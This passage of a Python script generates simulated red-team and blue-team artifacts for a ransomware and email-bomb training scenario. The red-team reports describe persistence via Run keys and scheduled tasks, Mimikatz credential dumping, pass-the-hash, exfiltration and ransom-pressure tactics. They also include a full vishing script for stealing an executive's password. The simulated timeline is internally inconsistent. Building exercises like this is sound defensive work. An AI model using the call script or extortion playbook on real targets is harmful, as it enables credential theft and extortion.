-----------------
Total Beacons: 73
Successful: 73 (100%)
Failed: 0
Average Response Time: 45ms
Data Transferred: 2.3 MB (outbound), 1.2 MB (inbound)

RECOMMENDATION
--------------
C2 communication stable. Continue operations as planned.
No changes to beacon interval or encryption required.
"""
    with open(ARTIFACTS_DIR / "c2_status_phase1.txt", 'w') as f:
        f.write(content)
    print("Created: c2_status_phase1.txt")

def create_recon_results():
    """Create Red Team reconnaissance results."""
    content = """Network Reconnaissance Results
===============================
Scan Period: 2024-01-15 08:30:00 - 10:30:00 UTC
Source: WS-FIN-042 (192.168.0.42)
Status: COMPLETE

TARGETS IDENTIFIED
------------------
1. DC-01 (192.168.0.10)
   Type: Domain Controller
   OS: Windows Server 2019
   Open Ports: 53, 88, 135, 139, 445, 3389, 5985
   Services: Active Directory, DNS, Kerberos
   Priority: CRITICAL

2. FS-01 (192.168.0.20)
   Type: File Server
   OS: Windows Server 2019
   Open Ports: 135, 139, 445, 3389, 5985
   Shares Discovered:
     - \\FS-01\\Finance (12.5 GB, 1,234 files)
     - \\FS-01\\R&D\\Proprietary (450 MB, 156 files)
   Priority: HIGH

3. FS-02 (192.168.0.21)
   Type: File Server
   OS: Windows Server 2019
   Open Ports: 135, 139, 445, 3389, 5985
   Shares Discovered:
     - \\FS-02\\HR (8.2 GB, 856 files)
     - \\FS-02\\HR\\PII (4.1 GB, 342 files) - HIGHLY SENSITIVE
   Priority: HIGH

4. BACKUP-01 (192.168.0.30)
   Type: Backup Server
   OS: Windows Server 2019
   Open Ports: 135, 139, 445, 3389, 5985
   Backup Software: Veeam Backup & Replication
   Priority: CRITICAL

NETWORK TOPOLOGY
----------------
Subnet: 192.168.0.0/24
Total Hosts: 256
Active Hosts: 45
Scanned: 45 (100%)
Vulnerable Services: SMB (445), RDP (3389), WinRM (5985)

PERSISTENCE VERIFICATION
------------------------
✓ Scheduled Task: UpdateCheck - ACTIVE
✓ Registry Run Key: UpdateCheck - ACTIVE
✓ WMI Event Subscription: Created
✓ Service Creation: Attempted (requires admin)

All persistence mechanisms verified and operational.

NEXT PHASE OBJECTIVES
---------------------
1. Escalate privileges to domain admin
2. Harvest credentials from memory
3. Move laterally to identified targets
4. Access sensitive data shares
5. Compromise backup systems
"""
    with open(ARTIFACTS_DIR / "recon_results_phase2.txt", 'w') as f:
        f.write(content)
    print("Created: recon_results_phase2.txt")

def create_persistence_status():
    """Create Red Team persistence status."""
    content = """Persistence Mechanisms Status Report
=========================================
Target: WS-FIN-042
Verification Time: 2024-01-15 10:30:00 UTC
Status: ALL ACTIVE

DEPLOYED MECHANISMS
-------------------
1. Scheduled Task: UpdateCheck
   Location: Task Scheduler
   Trigger: Every 5 minutes
   Command: powershell.exe -File C:\\Users\\finance.user\\AppData\\Local\\Temp\\payload.dll
   Status: ✓ ACTIVE
   Last Run: 2024-01-15 10:28:15 UTC
   Next Run: 2024-01-15 10:33:15 UTC

2. Registry Run Key
   Location: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
   Value Name: UpdateCheck
   Value Data: C:\\Users\\finance.user\\AppData\\Local\\Temp\\payload.dll
   Status: ✓ ACTIVE
   Verified: YES

3. WMI Event Subscription
   Event Filter: ProcessStart
   Consumer: ActiveScriptEventConsumer
   Script: payload.dll
   Status: ✓ ACTIVE

4. Service Creation
   Service Name: SystemUpdate
   Attempted: YES
   Status: FAILED (requires admin privileges)
   Note: Will retry after privilege escalation

VERIFICATION RESULTS
---------------------
All active persistence mechanisms verified.
System will maintain access after:
- User logout: YES
- System reboot: YES
- Security tool removal: PARTIAL (WMI survives)

DETECTION STATUS
----------------
EDR Detection: NONE
SIEM Alerts: NONE
Manual Review: NONE

All persistence mechanisms remain undetected.

RECOMMENDATION
--------------
Persistence established successfully. Ready to proceed with
privilege escalation and lateral movement phases.
"""
    with open(ARTIFACTS_DIR / "persistence_status_phase2.txt", 'w') as f:
        f.write(content)
    print("Created: persistence_status_phase2.txt")

def create_credential_success():
    """Create Red Team credential harvesting success report."""
    content = """Credential Harvesting Success Report
=========================================
Target: WS-FIN-042
Time: 2024-01-15 10:45:23 UTC
Status: SUCCESS

TECHNIQUE USED
--------------
Method: Memory Dump (lsass.exe)
Tool: Mimikatz (in-memory execution)
Process: lsass.exe (PID: 512)
Result: Domain Admin credentials obtained

CREDENTIALS OBTAINED
--------------------
Username: svc_backup
Domain: CORP
Password Hash: [NTLM Hash]
LM Hash: [LM Hash]
SID: S-1-5-21-1234567890-123456789-123456789-1105

PRIVILEGES
----------
- Domain Admin
- Backup Operator
- Local Administrator (all systems)
- Service Account

ACCESS VERIFICATION
-------------------
DC-01 (Domain Controller):
  Status: ✓ ACCESS GRANTED
  Method: Pass-the-Hash
  Time: 2024-01-15 10:45:24 UTC

FS-01 (File Server):
  Status: ✓ ACCESS GRANTED
  Method: Pass-the-Hash
  Time: 2024-01-15 10:46:12 UTC

FS-02 (File Server):
  Status: ✓ ACCESS GRANTED
  Method: Pass-the-Hash
  Time: 2024-01-15 10:52:33 UTC

BACKUP-01 (Backup Server):
  Status: ✓ ACCESS GRANTED
  Method: Pass-the-Hash
  Time: 2024-01-15 11:15:47 UTC

ALL TARGET SYSTEMS ACCESSIBLE

NEXT STEPS
----------
- Begin lateral movement to file servers
- Access sensitive data shares
- Compromise backup systems
- Prepare for data exfiltration
"""
    with open(ARTIFACTS_DIR / "credential_success_phase3.txt", 'w') as f:
        f.write(content)
    print("Created: credential_success_phase3.txt")

def create_lateral_status():
    """Create Red Team lateral movement status."""
    content = """Lateral Movement Status Report
===============================
Period: 2024-01-15 10:46:00 - 11:30:00 UTC
Status: COMPLETE

SYSTEMS COMPROMISED
-------------------
1. DC-01 (Domain Controller)
   Access: FULL DOMAIN ADMIN
   Time: 2024-01-15 10:45:24 UTC
   Activities:
     ✓ SYSVOL accessed
     ✓ Group Policy enumeration complete
     ✓ Domain trust relationships mapped
   Status: OPERATIONAL

2. FS-01 (File Server)
   Access: FULL ADMIN
   Time: 2024-01-15 10:46:12 UTC
   Shares Accessed:
     ✓ \\FS-01\\Finance
       - Files Enumerated: 1,234
       - Directories: 45
       - Total Size: 12.5 GB
       - Access: READ/WRITE
     ✓ \\FS-01\\R&D\\Proprietary
       - Files Enumerated: 156
       - Directories: 12
       - Total Size: 450 MB
       - Access: READ/WRITE
   Status: OPERATIONAL

3. FS-02 (File Server)
   Access: FULL ADMIN
   Time: 2024-01-15 10:52:33 UTC
   Shares Accessed:
     ✓ \\FS-02\\HR
       - Files Enumerated: 856
       - Directories: 23
       - Total Size: 8.2 GB
       - Access: READ/WRITE
     ✓ \\FS-02\\HR\\PII
       - Files Enumerated: 342
       - Directories: 12
       - Total Size: 4.1 GB
       - Classification: HIGHLY SENSITIVE
       - Access: READ/WRITE
   Status: OPERATIONAL

4. BACKUP-01 (Backup Server)
   Access: FULL ADMIN
   Time: 2024-01-15 11:15:47 UTC
   Backup Catalog:
     ✓ System_Backup_2024-01-14: ACCESSIBLE
     ✓ Database_Backup_2024-01-14: ACCESSIBLE
     ✓ FileServer_Backup_2024-01-14: ACCESSIBLE
     ✓ Total Backup Files: 2,109
     ✓ Total Size: 1.2 TB
   Status: OPERATIONAL

DATA IDENTIFIED FOR EXFILTRATION
--------------------------------
- Customer Databases: 45 GB
- Financial Records: 120 GB
- Employee PII: 8.2 GB
- Intellectual Property: 105 GB
- Legal Documents: 85 GB
Total: 363.2 GB identified

DETECTION STATUS
----------------
Security Alerts: 0
SIEM Correlations: 0
Manual Detection: 0

All lateral movement completed without detection.

READY FOR DATA EXFILTRATION PHASE
"""
    with open(ARTIFACTS_DIR / "lateral_status_phase3.txt", 'w') as f:
        f.write(content)
    print("Created: lateral_status_phase3.txt")

def create_exfiltration_progress():
    """Create Red Team exfiltration progress."""
    content = """Data Exfiltration Progress Report
===================================
Period: 2024-01-15 11:00:00 - 17:00:00 UTC
Status: COMPLETE

TARGET SYSTEMS
--------------
FS-01 (File Server):
  Status: COMPLETE (100%)
  Data Transferred: 270 GB
  Transfer Rate: 45 GB/hour
  Duration: 6 hours
  Upload Destination: Mega.nz

FS-02 (File Server):
  Status: COMPLETE (100%)
  Data Transferred: 180 GB
  Transfer Rate: 30 GB/hour
  Duration: 6 hours
  Upload Destination: Dropbox

TOTAL DATA EXFILTRATED: 450 GB

DATA CATEGORIES COLLECTED
-------------------------
✓ Customer Databases: 45 GB
  - Records: 125,000
  - Estimated Value: $6.25M

✓ Financial Records: 120 GB
  - Q1-Q4 2023 Financials
  - Q1 2024 Financials
  - Budget Documents
  - Vendor Contracts

✓ Employee PII: 8.2 GB
  - Records: 2,400
  - Includes: SSNs, Salaries, Medical Records

✓ Intellectual Property: 105 GB
  - Proprietary Algorithms
  - Research Data
  - Patent Applications
  - Source Code

✓ Legal Documents: 85 GB
  - Contracts
  - NDAs
  - Compliance Records
  - Legal Correspondence

✓ System Backups: 87 GB
  - Recent backup sets
  - Configuration files

UPLOAD STATUS
-------------
Mega.nz: 270 GB uploaded ✓
Dropbox: 180 GB uploaded ✓
Total: 450 GB / 450 GB (100%)

VERIFICATION
------------
All data verified and accessible at upload destinations.
Data integrity: 100%
Encryption: AES-256 (at rest)

LEVERAGE ASSESSMENT
-------------------
Data Value: $50+ million
Regulatory Impact: HIGH
Publication Threat: CREDIBLE
Negotiation Position: STRONG

STATUS: EXFILTRATION COMPLETE
Ready for encryption deployment phase.
"""
    with open(ARTIFACTS_DIR / "exfiltration_progress_phase4.txt", 'w') as f:
        f.write(content)
    print("Created: exfiltration_progress_phase4.txt")

def create_stolen_data_inventory():
    """Create Red Team stolen data inventory."""
    content = """Stolen Data Inventory
=====================
Compilation Date: 2024-01-15 17:00:00 UTC
Total Data: 450 GB
Status: VERIFIED AND ARCHIVED

HIGH-VALUE DATA CATEGORIES
---------------------------

1. Customer PII Database
   Volume: 45 GB
   Records: 125,000
   Data Types:
     - Names, Addresses, Phone Numbers
     - Email Addresses
     - Credit Card Information (last 4 digits)
     - Purchase History
   Estimated Value: $6.25M ($50/record)
   Regulatory Impact: GDPR, CCPA

2. Financial Records
   Volume: 120 GB
   Contents:
     - Q1-Q4 2023 Financial Statements
     - Q1 2024 Financial Statements
     - Budget Forecasts
     - Vendor Payment Records
     - Tax Documents
   Estimated Value: $10M+ (competitive intelligence)

3. Employee Data
   Volume: 8.2 GB
   Records: 2,400
   Data Types:
     - Social Security Numbers
     - Salaries and Compensation
     - Medical Records
     - Background Check Results
     - Performance Reviews
   Estimated Value: $2.4M
   Regulatory Impact: HIPAA, GDPR

4. Intellectual Property
   Volume: 105 GB
   Contents:
     - Proprietary Algorithms
     - Research Data
     - Patent Applications
     - Source Code Repositories
     - Product Designs
   Estimated Value: $30M+ (competitive advantage)

5. Legal Documents
   Volume: 85 GB
   Contents:
     - Vendor Contracts
     - Non-Disclosure Agreements
     - Compliance Records
     - Legal Correspondence
     - Merger/Acquisition Documents
   Estimated Value: $5M+ (legal leverage)

6. System Backups
   Volume: 87 GB
   Contents:
     - Recent System Backups
     - Configuration Files
     - Database Dumps
   Estimated Value: $1M+ (operational intelligence)

TOTAL ESTIMATED VALUE: $50+ million

PUBLICATION STRATEGY
--------------------
If ransom not paid within 72 hours:
- Leak site publication scheduled
- Data categorized for maximum impact
- Customer notification threat
- Regulatory body notification threat

NEGOTIATION LEVERAGE
--------------------
✓ High-value data exfiltrated
✓ Regulatory violations exposed
✓ Competitive intelligence obtained
✓ Customer trust at risk
✓ Legal implications significant

STATUS: MAXIMUM LEVERAGE ACHIEVED
"""
    with open(ARTIFACTS_DIR / "stolen_data_inventory_phase4.txt", 'w') as f:
        f.write(content)
    print("Created: stolen_data_inventory_phase4.txt")

def create_encryption_status():
    """Create Red Team encryption deployment status."""
    content = """Ransomware Deployment Status Report
====================================
Deployment Time: 2024-01-15 14:30:00 UTC
Status: COMPLETE

ENCRYPTION STATISTICS
---------------------
Total Systems Encrypted: 200+
Encryption Rate: 100%
Ransomware Variant: LockBit 3.0
Encryption Algorithm: AES-256 + RSA-2048

SYSTEMS ENCRYPTED BY CATEGORY
-----------------------------
File Servers: 15/15 (100%)
  - FS-01: ENCRYPTED
  - FS-02: ENCRYPTED
  - [13 additional file servers]

Application Servers: 8/8 (100%)
  - ERP System: ENCRYPTED (OFFLINE)
  - CRM System: ENCRYPTED (OFFLINE)
  - Email Server: ENCRYPTED (PARTIAL)
  - [5 additional application servers]

Workstations: 150/150 (100%)
  - All Finance Department: ENCRYPTED
  - All HR Department: ENCRYPTED
  - All R&D Department: ENCRYPTED
  - [Additional workstations]

Backup Systems: 1/1 (100%)
  - BACKUP-01: ENCRYPTED
  - Onsite Backups: ENCRYPTED
  - Note: Offsite backups may exist (36 hours old)

Domain Controllers: 2/2 (100%)
  - DC-01: ENCRYPTED
  - DC-02: ENCRYPTED

RANSOM NOTE DEPLOYMENT
----------------------
Status: DEPLOYED
Systems: All encrypted systems
Message: LockBit 3.0 standard note
Bitcoin Address: [REDACTED]
Deadline: 72 hours from deployment
Contact: Tor .onion address provided

BUSINESS IMPACT
---------------
Critical Systems Offline:
  - ERP System: OFFLINE
  - Email Server: PARTIAL
  - Customer Portal: OFFLINE
  - File Shares: INACCESSIBLE

Estimated Revenue Loss: $500K/day
Recovery Time (if paying): 2-3 weeks
Recovery Time (if using backups): 48-72 hours (if available)

LEVERAGE POINTS
---------------
✓ All systems encrypted
✓ Onsite backups encrypted
✓ Business operations halted
✓ Data exfiltrated (450 GB)
✓ Data publication threat available

STATUS: MAXIMUM IMPACT ACHIEVED
Awaiting victim response and negotiation.
"""
    with open(ARTIFACTS_DIR / "encryption_status_phase5.txt", 'w') as f:
        f.write(content)
    print("Created: encryption_status_phase5.txt")

def create_negotiation_status():
    """Create Red Team negotiation status."""
    content = """Ransom Negotiation Status
==========================
Demand: 50 BTC (~$1.2M USD at current rates)
Deadline: 72 hours from deployment
Deployment Time: 2024-01-15 14:30:00 UTC
Deadline: 2024-01-18 14:30:00 UTC

COMMUNICATION CHANNEL
---------------------
Method: Tor .onion address
Status: OPERATIONAL
Encryption: End-to-end encrypted
Anonymity: Full (Tor network)

VICTIM RESPONSE STATUS
----------------------
Initial Contact: PENDING
Counter-Offer: PENDING
Payment Status: PENDING
Negotiation Progress: 0%

LEVERAGE ASSESSMENT
-------------------
Current Leverage: MAXIMUM

✓ All systems encrypted (200+)
✓ Onsite backups encrypted
✓ Data exfiltrated (450 GB)
✓ Business operations halted
✓ Data publication threat available
✓ Regulatory violations exposed

NEGOTIATION STRATEGY
--------------------
Phase 1 (0-24 hours): Wait for initial contact
Phase 2 (24-48 hours): Begin negotiation if contacted
Phase 3 (48-72 hours): Increase pressure, threaten publication
Phase 4 (72+ hours): Publish data if no payment

DATA PUBLICATION PLAN
----------------------
If ransom not paid:
- Leak site publication: READY
- Data categorized: YES
- Customer notification: PREPARED
- Regulatory notification: PREPARED
- Media release: PREPARED

PAYMENT TRACKING
----------------
Bitcoin Address: [REDACTED]
Blockchain: Monitoring active
Payment Received: 0 BTC
Payment Required: 50 BTC
Payment Deadline: 2024-01-18 14:30:00 UTC

RECOMMENDATION
--------------
Maintain communication channel.
Wait for victim to initiate contact.
Be prepared to negotiate if contacted.
Execute publication plan if deadline passes without payment.

STATUS: AWAITING VICTIM RESPONSE
"""
    with open(ARTIFACTS_DIR / "negotiation_status_phase5.txt", 'w') as f:
        f.write(content)
    print("Created: negotiation_status_phase5.txt")

def create_attack_summary():
    """Create Red Team attack summary."""
    content = """Attack Summary Report - Mission Accomplished
==========================================
Campaign: Ransomware Deployment
Target: CORP.LOCAL
Duration: 9 hours 15 minutes
Status: SUCCESS

TIMELINE
--------
08:15 UTC - Initial Access (Phishing email)
08:17 UTC - Payload Execution (PowerShell)
08:17 UTC - Persistence Established
08:30 UTC - Network Reconnaissance Begins
10:30 UTC - Reconnaissance Complete
10:45 UTC - Privilege Escalation (Domain Admin)
10:46 UTC - Lateral Movement Begins
11:30 UTC - Lateral Movement Complete
11:00 UTC - Data Exfiltration Begins
17:00 UTC - Data Exfiltration Complete (450 GB)
14:30 UTC - Ransomware Deployment
14:35 UTC - Encryption Complete (200+ systems)

RESULTS
-------
✓ Initial Access: SUCCESS
✓ Persistence: SUCCESS (4 mechanisms)
✓ Privilege Escalation: SUCCESS (Domain Admin)
✓ Lateral Movement: SUCCESS (4 critical systems)
✓ Data Exfiltration: SUCCESS (450 GB)
✓ Ransomware Deployment: SUCCESS (200+ systems)
✓ Backup Encryption: SUCCESS (onsite backups)

SYSTEMS COMPROMISED
-------------------
- Domain Controllers: 2/2
- File Servers: 15/15
- Application Servers: 8/8
- Workstations: 150/150
- Backup Systems: 1/1

DATA EXFILTRATED
----------------
Total: 450 GB
Categories:
  - Customer PII: 125,000 records
  - Financial Records: Complete Q1-Q4 2023, Q1 2024
  - Employee Data: 2,400 records
  - Intellectual Property: Proprietary algorithms, research
  - Legal Documents: Contracts, NDAs

Estimated Value: $50+ million

BUSINESS IMPACT
---------------
Revenue Loss: $500K/day
Systems Offline: 200+
Critical Services: ERP, Email, Customer Portal
Recovery Time: 48-72 hours (if backups available)
Recovery Time: 2-3 weeks (if paying ransom)

DETECTION EVASION
-----------------
EDR Alerts Triggered: 0
SIEM Correlations: 0
Manual Detection: 0
Security Response: DELAYED

All phases completed without detection until encryption phase.

NEGOTIATION STATUS
------------------
Demand: 50 BTC (~$1.2M USD)
Deadline: 72 hours
Payment Received: 0 BTC
Status: AWAITING VICTIM RESPONSE

LEVERAGE
--------
✓ All systems encrypted
✓ Backups encrypted
✓ Data exfiltrated
✓ Business operations halted
✓ Data publication threat available

Maximum leverage achieved.

FINAL STATUS
------------
Mission: ACCOMPLISHED
Impact: MAXIMUM
Detection: MINIMAL
Leverage: MAXIMUM

Ready for negotiation or data publication phase.
"""
    with open(ARTIFACTS_DIR / "attack_summary_phase5.txt", 'w') as f:
        f.write(content)
    print("Created: attack_summary_phase5.txt")

# ============================================================================
# Email Bomb & Social Engineering Attack Scenario Artifacts
# ============================================================================

def create_email_volume_alert():
    """Create email server volume alert for Blue Team."""
    content = """Email Server Monitoring Alert
========================================
Alert ID: EMAIL-2024-0115-091530
Timestamp: 2024-01-15 09:15:30 UTC
Severity: CRITICAL
Alert Type: Unusual Email Volume Spike

Affected User: executive@corp.local
Baseline: 50-100 emails/day (normal)
Current Volume: 8,247 emails in 30 minutes
Volume Increase: 8,200% above baseline

Email Breakdown:
----------------
Newsletter Subscriptions: 3,712 (45%)
Marketing Campaigns: 2,474 (30%)
Confirmation Emails: 1,237 (15%)
Other: 824 (10%)

Source Analysis:
----------------
Unique Sending Domains: 203
Top Sending Domains:
  - newsletter-subscription.com (1,245 emails)
  - marketing-campaigns.net (987 emails)
  - email-confirmations.org (654 emails)
  - promotional-offers.info (523 emails)
  - subscription-services.biz (412 emails)

IP Address Analysis:
-----------------
Unique Source IPs: 187
Geographic Distribution:
  - United States: 45%
  - Netherlands: 23%
  - Germany: 18%
  - Other: 14%

Email Server Performance:
-------------------------
Inbox Processing: DEGRADED
Server Load: 85% (normal: 15-25%)
Response Time: 2.3 seconds (normal: <0.5s)
Storage Impact: +2.1 GB in 30 minutes

Pattern Analysis:
-----------------
All emails sent within 30-minute window
Similar subject line patterns
Diverse sender addresses but coordinated timing
SPF records: 67% softfail, 23% neutral
DKIM signatures: Missing or invalid (89%)

Recommendation:
---------------
This pattern indicates a coordinated EMAIL BOMB attack.
Immediate action required:
1. Block top sending domains
2. Alert user before social engineering follow-up
3. Implement temporary email filtering rules
4. Monitor for suspicious support calls

Status: ACTIVE ATTACK IN PROGRESS
"""
    with open(ARTIFACTS_DIR / "email_volume_alert_phase1.txt", 'w') as f:
        f.write(content)
    print("Created: email_volume_alert_phase1.txt")


def create_email_header_analysis():
    """Create email header analysis for Blue Team."""
    content = """Email Header Analysis Report
==================================
Analysis Date: 2024-01-15 09:20:00 UTC
Analyst: Security Operations Center
Sample Size: 50 emails from email bomb attack

Header Pattern Analysis:
------------------------
All emails contain similar header patterns:
- X-Originating-IP: Cloud hosting providers (AWS, Azure, GCP)
- Received: Multiple hops through legitimate mail servers
- Return-Path: Diverse but newly registered domains
- Message-ID: Sequential patterns suggesting automation

SPF Record Analysis:
--------------------
Domain: newsletter-subscription.com
SPF Record: v=spf1 include:_spf.google.com ~all
Result: SOFTFAIL (67% of emails)

Domain: marketing-campaigns.net
SPF Record: v=spf1 ip4:192.0.2.0/24 ~all
Result: NEUTRAL (23% of emails)

Domain: email-confirmations.org
SPF Record: v=spf1 include:amazonses.com ~all
Result: PASS but domain registered 3 days ago

DKIM Signature Analysis:
------------------------
Valid DKIM: 11% (6/50 emails)
Invalid/Missing DKIM: 89% (44/50 emails)
This is highly unusual for legitimate bulk email

DMARC Policy:
-------------
Most domains: No DMARC policy
Some domains: p=none (no enforcement)
No domains: p=quarantine or p=reject

Domain Age Analysis:
--------------------
Domain Registration Dates:
- 0-7 days old: 78% of domains
- 8-30 days old: 15% of domains
- 31+ days old: 7% of domains

Conclusion: Coordinated attack using newly registered domains

Email Content Analysis:
-----------------------
Subject Lines: Diverse but generic
  - "Your subscription confirmation"
  - "Special offer just for you"
  - "Confirm your email address"
  - "Newsletter subscription"

Body Content: Minimal HTML, mostly text
Links: Present but not malicious (legitimate-looking)
Attachments: None

Timing Analysis:
----------------
All emails sent within 30-minute window
Peak sending: 09:15-09:20 UTC (5,000 emails)
Sending pattern: Burst-like, not gradual
Suggests automated script or botnet

Threat Assessment:
------------------
Confidence Level: 95% EMAIL BOMB ATTACK
Purpose: Overwhelm inbox, create urgency
Expected Follow-up: Social engineering call
Risk Level: HIGH

Recommended Actions:
--------------------
1. Block all identified sending domains
2. Implement temporary rate limiting
3. Alert user immediately
4. Monitor for support calls
5. Document for security awareness training
"""
    with open(ARTIFACTS_DIR / "email_header_analysis_phase1.txt", 'w') as f:
        f.write(content)
    print("Created: email_header_analysis_phase1.txt")


def create_email_bomb_status():
    """Create email bomb deployment status for Red Team."""
    content = """Email Bomb Deployment Report
====================================
Operation: INBOX OVERWHELM
Target: executive@corp.local
Status: SUCCESS

Deployment Summary:
-------------------
Total Emails Sent: 8,247
Delivery Success Rate: 94.2% (7,769 delivered)
Failed Deliveries: 478 (5.8%)
Time Window: 30 minutes (09:15-09:45 UTC)
Peak Sending Rate: 275 emails/minute

Email Distribution:
-------------------
Newsletter Subscriptions: 3,712 (45%)
  - Purpose: Appear legitimate
  - Source: 45 different domains
  - Success Rate: 96%

Marketing Campaigns: 2,474 (30%)
  - Purpose: Create urgency
  - Source: 38 different domains
  - Success Rate: 93%

Confirmation Emails: 1,237 (15%)
  - Purpose: Mimic legitimate services
  - Source: 32 different domains
  - Success Rate: 95%

Other: 824 (10%)
  - Purpose: Diversify pattern
  - Source: 28 different domains
  - Success Rate: 92%

Infrastructure:
--------------
Sending Domains: 203 unique domains
Sending IPs: 187 unique IP addresses
Cloud Providers: AWS (45%), Azure (30%), GCP (25%)
Geographic Distribution: US, NL, DE (to appear legitimate)

Email Characteristics:
----------------------
SPF Records: Configured for softfail/neutral
DKIM: Mostly missing (to avoid tracking)
Subject Lines: Generic and diverse
Content: Minimal, legitimate-looking
Attachments: None (to avoid detection)

Target Impact:
--------------
Inbox Status: OVERWHELMED
User Access: Severely degraded
Email System: Performance impacted
User Frustration: HIGH (confirmed via monitoring)

Next Steps:
-----------
1. Monitor target's response
2. Prepare support call script
3. Research target's IT support procedures
4. Set up fake support portal
5. Initiate social engineering call within 30-60 minutes

Timeline:
---------
09:15 UTC: Email bomb deployment started
09:45 UTC: Email bomb deployment completed
09:50 UTC: Target inbox confirmed overwhelmed
10:00 UTC: Support call scheduled

Status: PHASE 1 COMPLETE - Ready for Phase 2
"""
    with open(ARTIFACTS_DIR / "email_bomb_status_phase1.txt", 'w') as f:
        f.write(content)
    print("Created: email_bomb_status_phase1.txt")


def create_call_script():
    """Create call script for Red Team."""
    content = """Social Engineering Call Script
==================================
Target: Executive (VP of Operations)
Scenario: Email Bomb Follow-up
Caller Identity: Mike from IT Support
Call Duration: 10-15 minutes

Pre-Call Research:
------------------
Target Name: [Executive Name]
Role: VP of Operations
Department: Operations
IT Support Contact: Internal helpdesk (ext. 5555)
Support Hours: 8 AM - 6 PM EST
Support Portal: support.corp.local
Support Procedures: Standard identity verification

Call Script:
------------
[Opening - Build Rapport]
"Hello, this is Mike from IT Support. I'm calling because we've detected an unusual email issue affecting your account. Is this a good time to talk?"

[Create Urgency]
"We've noticed your inbox has been flooded with emails in the past hour - over 8,000 emails. This is preventing you from accessing your important messages, correct?"

[Establish Legitimacy]
"I can help you resolve this right away. We've seen this before - it's usually caused by a subscription service that got your email address. We can clean it up in about 5 minutes."

[Identity Verification - REVERSE]
"To make sure I'm talking to the right person, can you confirm your username? It should be executive@corp.local, correct?"

[Guide to Portal]
"Great. Now, to fix this quickly, I need you to access our secure support portal. Can you open your browser and go to support-corp-help.tk? That's support-corp-help dot T-K."

[Portal Instructions]
"Once you're there, you'll see a login page. This is our secure verification system. I need you to enter your corporate username and password so we can verify your identity and restore your email access."

[Handle Objections]
If asked about unusual URL:
"This is our temporary support portal we use for urgent issues. The regular portal is down for maintenance, but this one is secure and verified."

If asked about password:
"I understand your concern. This is just for verification - we need to confirm it's really you before we can make changes to your account. It's the same security process we always use."

[Closing]
"Perfect. Once you've logged in, I'll be able to see your account and clean up those emails. This should only take a few minutes. Can you let me know when you've logged in?"

[Post-Call]
- Monitor fake portal for credentials
- Verify credentials work
- Prepare for Phase 3

Key Points:
-----------
- Sound professional and helpful
- Use the email bomb as pretext
- Create urgency but not panic
- Guide, don't demand
- Be patient if target is hesitant

Status: READY FOR EXECUTION
"""
    with open(ARTIFACTS_DIR / "call_script_phase1.txt", 'w') as f:
        f.write(content)
    print("Created: call_script_phase1.txt")


def create_support_call_log():
    """Create support call log for Blue Team."""
    content = """Phone System Call Log
==========================
Call ID: CALL-2024-0115-094512
Date: 2024-01-15
Time: 09:45:12 UTC
Duration: 12 minutes 34 seconds

Call Details:
-------------
Caller ID: +1-555-0123
Caller Name: [Not in directory]
Call Type: Incoming
Destination: Executive Extension (x-1234)
Call Quality: Good
Recording: YES (available)

Caller Information:
-------------------
Phone Number: +1-555-0123
Carrier: Unknown
Location: Not available
Number Type: Mobile (suspected VoIP)
Number Reputation: Not in known IT support contacts

Call Transcript Summary:
------------------------
[09:45:12] Caller: "Hello, this is Mike from IT Support. I'm calling because we've detected an unusual email issue affecting your account."

[09:45:18] Executive: "Yes, my inbox is completely flooded. I can't access anything."

[09:45:25] Caller: "We've noticed over 8,000 emails in the past hour. I can help you resolve this right away."

[09:45:32] Executive: "That would be great. How long will this take?"

[09:45:38] Caller: "About 5 minutes. First, I need to verify your identity. Can you confirm your username is executive@corp.local?"

[09:45:45] Executive: "Yes, that's correct."

[09:45:50] Caller: "Perfect. Now, to fix this quickly, I need you to access our secure support portal. Can you go to support-corp-help.tk?"

[09:46:05] Executive: "That URL looks unusual. Is that the normal support portal?"

[09:46:12] Caller: "This is our temporary portal for urgent issues. The regular one is down for maintenance, but this is secure and verified."

[09:46:25] Executive: "Okay, I'm there. What do I need to do?"

[09:46:32] Caller: "You'll see a login page. Enter your corporate username and password so we can verify your identity and restore your email access."

[09:47:15] Executive: "I've logged in. Now what?"

[09:47:22] Caller: "Great! I can see your account now. Let me clean up those emails. This will take just a few minutes. You should see your inbox return to normal shortly."

[09:47:35] Executive: "Thank you so much for your help!"

[09:47:40] Caller: "You're welcome. If you have any issues, just call us back. Have a great day!"

[09:47:45] Call ended.

Red Flags Identified:
---------------------
1. Caller ID not in known IT support contacts
2. No legitimate IT support ticket exists
3. Unusual URL (support-corp-help.tk)
4. Request for password (IT never asks for passwords)
5. Timing suspicious (30 minutes after email bomb)
6. Urgency created artificially
7. Caller verified identity in reverse (unusual)

Security Assessment:
--------------------
Confidence: 95% SOCIAL ENGINEERING ATTACK
Risk Level: CRITICAL
Action Required: IMMEDIATE

Recommendations:
----------------
1. Alert executive immediately
2. Verify no credentials were provided
3. Block fake support portal domain
4. Force password reset if credentials provided
5. Document for security awareness training

Status: SECURITY INCIDENT - ACTION REQUIRED
"""
    with open(ARTIFACTS_DIR / "support_call_log_phase2.txt", 'w') as f:
        f.write(content)
    print("Created: support_call_log_phase2.txt")


def create_se_indicators():
    """Create social engineering indicators report for Blue Team."""
    content = """Social Engineering Indicators Report
==========================================
Incident ID: SE-2024-0115-094512
Date: 2024-01-15
Time: 09:45:12 UTC
Analyst: Security Operations Center

Incident Summary:
-----------------
Executive received unsolicited phone call from individual claiming to be IT Support. Call occurred 30 minutes after email bomb attack began. Caller attempted to guide executive to fake support portal and request credentials.

Social Engineering Indicators:
-------------------------------
1. UNSOLICITED CONTACT
   - No legitimate IT support ticket exists
   - Executive did not request support
   - Caller initiated contact

2. URGENCY CREATED
   - Email bomb used as pretext
   - "I can help you resolve this right away"
   - "This will only take 5 minutes"
   - Creates time pressure

3. IDENTITY VERIFICATION REVERSED
   - Caller asked executive to verify identity
   - Normal process: IT verifies caller's identity
   - Red flag: Asking target to verify themselves

4. UNUSUAL REQUEST
   - Request for password (IT never asks for passwords)
   - Unusual URL (support-corp-help.tk)
   - Not the standard support portal

5. TIMING SUSPICIOUS
   - Call occurred 30 minutes after email bomb
   - Too coincidental to be legitimate
   - Suggests coordinated attack

6. CALLER ID VERIFICATION
   - Phone number not in known IT support contacts
   - Number appears to be VoIP (easily spoofed)
   - No caller name in directory

7. PROFESSIONAL BUT PRESSURE
   - Caller sounded professional
   - But created sense of urgency
   - Guided rather than demanded (sophisticated)

Attack Pattern:
---------------
This matches the classic "Email Bomb + Support Call" social engineering attack:
1. Overwhelm inbox (email bomb) ✓
2. Create urgency and frustration ✓
3. Call posing as IT support ✓
